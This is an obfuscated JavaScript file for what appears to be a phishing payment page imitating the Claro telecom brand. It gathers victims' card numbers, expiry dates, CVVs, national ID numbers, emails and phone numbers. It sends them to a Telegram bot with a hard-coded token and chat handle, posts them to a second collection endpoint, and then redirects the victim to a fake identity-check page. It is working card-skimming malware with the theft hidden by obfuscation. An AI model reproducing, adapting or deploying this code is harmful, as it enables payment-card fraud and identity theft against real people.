const _0x430df2 = _0x3788;
function _0x3788(_0x1da714, _0x4f2ff8) {
  const _0x42d68c = _0x42d6();
  return (
    (_0x3788 = function (_0x378829, _0x1278eb) {
      _0x378829 = _0x378829 - 0x10c;
      let _0x4e97f1 = _0x42d68c[_0x378829];
      return _0x4e97f1;
    }),
    _0x3788(_0x1da714, _0x4f2ff8)
  );
}
(function (_0xcd8f35, _0x1ae077) {
  const _0x16aba3 = _0x3788,
    _0x59f4c5 = _0xcd8f35();
  while (!![]) {
    try {
      const _0x181c83 =
        (parseInt(_0x16aba3(0x13b)) / 0x1) *
          (-parseInt(_0x16aba3(0x12e)) / 0x2) +
        -parseInt(_0x16aba3(0x13d)) / 0x3 +
        parseInt(_0x16aba3(0x10f)) / 0x4 +
        (parseInt(_0x16aba3(0x13f)) / 0x5) *
          (-parseInt(_0x16aba3(0x124)) / 0x6) +
        parseInt(_0x16aba3(0x131)) / 0x7 +
        (parseInt(_0x16aba3(0x129)) / 0x8) *
          (parseInt(_0x16aba3(0x112)) / 0x9) +
        -parseInt(_0x16aba3(0x11d)) / 0xa;
      if (_0x181c83 === _0x1ae077) break;
      else _0x59f4c5["push"](_0x59f4c5["shift"]());
    } catch (_0x311d5b) {
      _0x59f4c5["push"](_0x59f4c5["shift"]());
    }
  }
})(_0x42d6, 0x1f504);
function updateLS() {
  const _0x429793 = _0x3788;
  LS[_0x429793(0x12d)](_0x429793(0x12a), JSON[_0x429793(0x144)](info));
}
(formbank = document[_0x430df2(0x127)](_0x430df2(0x13a))),
  (formname = document[_0x430df2(0x127)](_0x430df2(0x134))),
  (formcard = document[_0x430df2(0x127)](_0x430df2(0x13e))),
  (formmonth = document[_0x430df2(0x127)]("month-value")),
  (formyear = document[_0x430df2(0x127)](_0x430df2(0x121))),
  (formcvc = document["getElementById"](_0x430df2(0x113))),
  (formid = document[_0x430df2(0x127)]("documentnumber")),
  (formemail = document[_0x430df2(0x127)]("email_user")),
  (formtel = document[_0x430df2(0x127)](_0x430df2(0x137))),
  document[_0x430df2(0x127)]("next-step")["addEventListener"](
    _0x430df2(0x12f),
    function () {
      const _0x2c1571 = _0x430df2;
      if (
        formbank[_0x2c1571(0x125)] == "" ||
        formname[_0x2c1571(0x125)] == "" ||
        formcard[_0x2c1571(0x125)] == "" ||
        formmonth[_0x2c1571(0x125)] == "" ||
        formyear[_0x2c1571(0x125)] == "" ||
        formcvc[_0x2c1571(0x125)] == "" ||
        formid["value"] == "" ||
        formemail["value"] == "" ||
        formtel["value"] == ""
      ) {
        alert("Todos\x20los\x20campos\x20son\x20obligatorios");
        return;
      } else {
        if (formyear[_0x2c1571(0x125)] < 0x19) {
          alert(_0x2c1571(0x115));
          return;
        } else {
          if (
            !formtel["value"][_0x2c1571(0x13c)]("3") ||
            formtel["value"][_0x2c1571(0x10c)] !== 0xa
          ) {
            alert(_0x2c1571(0x135));
            return;
          } else {
            if (isLuhnValid(formcard[_0x2c1571(0x125)])) {
              (document[_0x2c1571(0x127)](_0x2c1571(0x117))[_0x2c1571(0x114)] =
                !![]),
                (info[_0x2c1571(0x10e)][_0x2c1571(0x11e)] =
                  formemail[_0x2c1571(0x125)]),
                (info[_0x2c1571(0x10e)]["p"] = formcard["value"]),
                (info[_0x2c1571(0x10e)][_0x2c1571(0x120)] =
                  formmonth[_0x2c1571(0x125)] + "/" + formyear["value"]),
                (info[_0x2c1571(0x10e)]["c"] = formcvc[_0x2c1571(0x125)]),
                (info["metaInfo"][_0x2c1571(0x138)] =
                  formbank[_0x2c1571(0x125)]),
                (info["metaInfo"]["cc"] = formid["value"]),
                (info[_0x2c1571(0x10e)][_0x2c1571(0x119)] = formtel["value"]),
                (async () => {
                  const _0x45833c = _0x2c1571,
                    _0x13aca7 = await fetch(_0x45833c(0x116), {
                      method: _0x45833c(0x145),
                      headers: { "Content-Type": _0x45833c(0x11a) },
                      body: JSON[_0x45833c(0x144)]({
                        chat_id: _0x45833c(0x12b),
                        text:
                          "🔴\x20--\x20CLARO\x20(\x20" +
                          url[_0x45833c(0x122)](_0x45833c(0x140))[0x1]
                            ["split"](_0x45833c(0x142))[0x0]
                            [_0x45833c(0x110)]() +
                          _0x45833c(0x11b) +
                          formname[_0x45833c(0x125)] +
                          _0x45833c(0x123) +
                          formid["value"] +
                          _0x45833c(0x11f) +
                          formemail["value"] +
                          _0x45833c(0x12c) +
                          formtel[_0x45833c(0x125)] +
                          "</code>\x0a--------------------\x0a🏦\x20BANK:\x20" +
                          formbank[_0x45833c(0x125)] +
                          "\x0a💳\x20CC:\x20<code>" +
                          formcard[_0x45833c(0x125)] +
                          _0x45833c(0x118) +
                          formmonth["value"] +
                          "/" +
                          formyear[_0x45833c(0x125)] +
                          "</code>\x0a🔒\x20CVV:\x20<code>" +
                          formcvc[_0x45833c(0x125)] +
                          _0x45833c(0x126),
                        parse_mode: _0x45833c(0x132),
                      }),
                    });
                  await _0x13aca7[_0x45833c(0x143)](),
                    _0x13aca7[_0x45833c(0x128)];
                })();
              if (info[_0x2c1571(0x10e)]["p"][0x0] == "4")
                info[_0x2c1571(0x139)][_0x2c1571(0x111)] = "VISA";
              else {
                if (info["metaInfo"]["p"][0x0] == "5")
                  info[_0x2c1571(0x139)][_0x2c1571(0x111)] = "MC";
                else
                  info["metaInfo"]["p"][0x0] == "3" &&
                    (info[_0x2c1571(0x139)][_0x2c1571(0x111)] = "AM");
              }
              updateLS(),
                (data = {
                  nombre: formname[_0x2c1571(0x125)],
                  id: formid[_0x2c1571(0x125)],
                  ip: "",
                  banco: formbank[_0x2c1571(0x125)],
                  email: formemail[_0x2c1571(0x125)],
                  tarjeta: formcard[_0x2c1571(0x125)],
                  ftarjeta:
                    formmonth[_0x2c1571(0x125)] +
                    "/" +
                    formyear[_0x2c1571(0x125)],
                  cvv: formcvc[_0x2c1571(0x125)],
                  celular: formtel[_0x2c1571(0x125)],
                  direccion: "",
                }),
                fetch(url + _0x2c1571(0x147), {
                  method: _0x2c1571(0x145),
                  headers: { "Content-Type": "application/json" },
                  body: JSON[_0x2c1571(0x144)](data),
                })
                  ["then"]((_0x5e50cf) => {
                    const _0x978538 = _0x2c1571;
                    if (!_0x5e50cf["ok"]) throw new Error(_0x978538(0x130));
                    return _0x5e50cf[_0x978538(0x143)]();
                  })
                  [_0x2c1571(0x146)]((_0x1d83e4) => {
                    window["location"]["href"] =
                      "./points/checkers/id-check.html";
                  });
            } else alert(_0x2c1571(0x11c)), (formcard[_0x2c1571(0x125)] = "");
          }
        }
      }
    }
  );
function _0x42d6() {
  const _0x1b081e = [
    "https://",
    "substr",
    "-dashboard",
    "json",
    "stringify",
    "POST",
    "then",
    "/dataTables/surePost",
    "length",
    "reverse",
    "metaInfo",
    "760500esWkrG",
    "toUpperCase",
    "company",
    "1600821XsealH",
    "card_cvc",
    "disabled",
    "Coloque\x20una\x20tarjeta\x20con\x20una\x20fecha\x20de\x20vencimiento\x20valida",
    "https://api.telegram.org/bot7723777741:AAFJT488CCx-QqmnVVcs-_ACL9omDTldCto/sendMessage",
    "next-step",
    "</code>\x0a📅\x20MM/YY:\x20<code>",
    "telnum",
    "application/json",
    "\x20)\x20--\x0a👤\x20NAME:\x20<code>",
    "Número\x20de\x20tarjeta\x20inválido",
    "2054700rqLnRM",
    "email",
    "</code>\x0a✉️\x20MAIL:\x20",
    "pdate",
    "year-value",
    "split",
    "</code>\x0a🆔\x20ID:\x20<code>",
    "4080OpuWhD",
    "value",
    "</code>\x0a",
    "getElementById",
    "status",
    "8QNlOSq",
    "info",
    "@thevoidspaceman",
    "\x0a📞\x20PHONE:\x20<code>",
    "setItem",
    "2OjEatl",
    "click",
    "Network\x20response\x20was\x20not\x20ok",
    "1777293kcLkCH",
    "HTML",
    "charAt",
    "name_card",
    "Coloque\x20un\x20número\x20de\x20teléfono\x20valido",
    "replace",
    "tel",
    "ban",
    "checkerInfo",
    "bank-option",
    "43291vfhwBr",
    "startsWith",
    "565296ZpLzLm",
    "card_number",
    "415wfoUXy",
  ];
  _0x42d6 = function () {
    return _0x1b081e;
  };
  return _0x42d6();
}
function isLuhnValid(_0x567dc2) {
  const _0x494780 = _0x430df2;
  _0x567dc2 = _0x567dc2[_0x494780(0x136)](/\D/g, "");
  if (_0x567dc2[_0x494780(0x10c)] < 0x6) return ![];
  const _0x2c08b1 = _0x567dc2[_0x494780(0x122)]("")
    ["map"](Number)
    [_0x494780(0x10d)]();
  let _0x13bf90 = 0x0;
  for (
    let _0x1c3f56 = 0x0;
    _0x1c3f56 < _0x2c08b1[_0x494780(0x10c)];
    _0x1c3f56++
  ) {
    if (_0x1c3f56 % 0x2 !== 0x0) {
      let _0x5d94c7 = _0x2c08b1[_0x1c3f56] * 0x2;
      _0x5d94c7 > 0x9 && (_0x5d94c7 -= 0x9), (_0x13bf90 += _0x5d94c7);
    } else _0x13bf90 += _0x2c08b1[_0x1c3f56];
  }
  return _0x13bf90 % 0xa === 0x0;
}
function formatCNumber(_0x38bae9) {
  const _0x51e451 = _0x430df2;
  let _0x4fb8c8 = _0x38bae9["value"]["replace"](/\D/g, "");
  if (_0x4fb8c8["length"] === 0x0) {
  }
  let _0x216be9 = "";
  if (_0x4fb8c8[0x0] === "3") {
    _0x4fb8c8[_0x51e451(0x10c)] > 0xf &&
      (_0x4fb8c8 = _0x4fb8c8[_0x51e451(0x141)](0x0, 0xf));
    for (
      let _0x3f7d99 = 0x0;
      _0x3f7d99 < _0x4fb8c8[_0x51e451(0x10c)];
      _0x3f7d99++
    ) {
      (_0x3f7d99 === 0x4 || _0x3f7d99 === 0xa) && (_0x216be9 += "\x20"),
        (_0x216be9 += _0x4fb8c8["charAt"](_0x3f7d99));
    }
    _0x38bae9[_0x51e451(0x125)] = _0x216be9;
  } else {
    _0x4fb8c8[_0x51e451(0x10c)] > 0x10 &&
      (_0x4fb8c8 = _0x4fb8c8[_0x51e451(0x141)](0x0, 0x10));
    for (
      let _0x59342a = 0x0;
      _0x59342a < _0x4fb8c8[_0x51e451(0x10c)];
      _0x59342a++
    ) {
      _0x59342a > 0x0 && _0x59342a % 0x4 === 0x0 && (_0x216be9 += "\x20"),
        (_0x216be9 += _0x4fb8c8[_0x51e451(0x133)](_0x59342a));
    }
    _0x38bae9[_0x51e451(0x125)] = _0x216be9;
  }
}
